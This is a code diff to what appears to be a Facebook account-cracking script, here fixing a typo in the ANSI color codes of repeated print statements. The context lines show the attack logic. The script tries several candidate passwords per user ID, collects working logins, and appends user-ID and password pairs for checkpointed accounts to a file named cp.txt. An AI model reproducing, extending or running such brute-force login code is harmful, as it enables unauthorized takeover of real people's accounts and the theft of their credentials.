@@ -380,7 +380,7 @@ def b_menu_select():
 		        oks.append(uid)
 		    else:
 			if 'www.facebook.com' in d['error_msg']:
-		            print("\x1b[1;93m[x1b[1;97mJAM-CP\x1b[1;93m]\x1b[1;93m "+uid+"\x1b[1;93m | \x1b[1;93m"+pass1+"\x1b[1;93m | \x1b[1;93m"+name)
+		            print("\x1b[1;93m[\x1b[1;97mJAM-CP\x1b[1;93m]\x1b[1;93m "+uid+"\x1b[1;93m | \x1b[1;93m"+pass1+"\x1b[1;93m | \x1b[1;93m"+name)
 		            cp=open("cp.txt","a")
 		            cp.write(uid+" | "+pass1+"\n")
 		            cp.close()
@@ -397,7 +397,7 @@ def b_menu_select():
 		                oks.append(uid)
 			    else:
 			        if 'www.facebook.com' in d['error_msg']:
-		                    print("\x1b[1;93m[x1b[1;97mJAM-CP\x1b[1;93m]\x1b[1;93m "+uid+"\x1b[1;93m | \x1b[1;93m"+pass2+"\x1b[1;93m | \x1b[1;93m"+name)
+		                    print("\x1b[1;93m[\x1b[1;97mJAM-CP\x1b[1;93m]\x1b[1;93m "+uid+"\x1b[1;93m | \x1b[1;93m"+pass2+"\x1b[1;93m | \x1b[1;93m"+name)
 		                    cp=open("cp.txt","a")
 		                    cp.write(uid+" | "+pass2+"\n")
 		                    cp.close()
@@ -414,7 +414,7 @@ def b_menu_select():
 		                        oks.append(uid)
 		                    else:
 					if 'www.facebook.com' in d['error_msg']:
-		                            print("\x1b[1;93m[x1b[1;97mJAM-CP\x1b[1;93m]\x1b[1;93m "+uid+"\x1b[1;93m | \x1b[1;93m"+pass3+"\x1b[1;93m | \x1b[1;93m"+name)
+		                            print("\x1b[1;93m[\x1b[1;97mJAM-CP\x1b[1;93m]\x1b[1;93m "+uid+"\x1b[1;93m | \x1b[1;93m"+pass3+"\x1b[1;93m | \x1b[1;93m"+name)
 		                            cp=open("cp.txt","a")
 		                            cp.write(uid+" | "+pass3+"\n")
 		                            cp.close()
@@ -431,7 +431,7 @@ def b_menu_select():
 		                                oks.append(uid)
 		                            else:
 						if 'www.facebook.com' in d['error_msg']:
-		                                    print("\x1b[1;93m[x1b[1;97mJAM-CP\x1b[1;93m]\x1b[1;93m "+uid+"\x1b[1;93m | \x1b[1;93m"+pass4+"\x1b[1;93m | \x1b[1;93m"+name)
+		                                    print("\x1b[1;93m[\x1b[1;97mJAM-CP\x1b[1;93m]\x1b[1;93m "+uid+"\x1b[1;93m | \x1b[1;93m"+pass4+"\x1b[1;93m | \x1b[1;93m"+name)
 		                                    cp=open("cp.txt","a")
 		                                    cp.write(uid+" | "+pass4+"\n")
 		                                    cp.close()
@@ -448,7 +448,7 @@ def b_menu_select():
 		                                        oks.append(uid)
 						    else:
 						        if 'www.facebook.com' in d['error_msg']:
-		                                            print("\x1b[1;93m[x1b[1;97mJAM-CP\x1b[1;93m]\x1b[1;93m "+uid+"\x1b[1;93m | \x1b[1;93m"+pass5+"\x1b[1;93m | \x1b[1;93m"+name)
+		                                            print("\x1b[1;93m[\x1b[1;97mJAM-CP\x1b[1;93m]\x1b[1;93m "+uid+"\x1b[1;93m | \x1b[1;93m"+pass5+"\x1b[1;93m | \x1b[1;93m"+name)
 		                                            cp=open("cp.txt","a")
 		                                            cp.write(uid+" | "+pass5+"\n")
 		                                            cp.close()
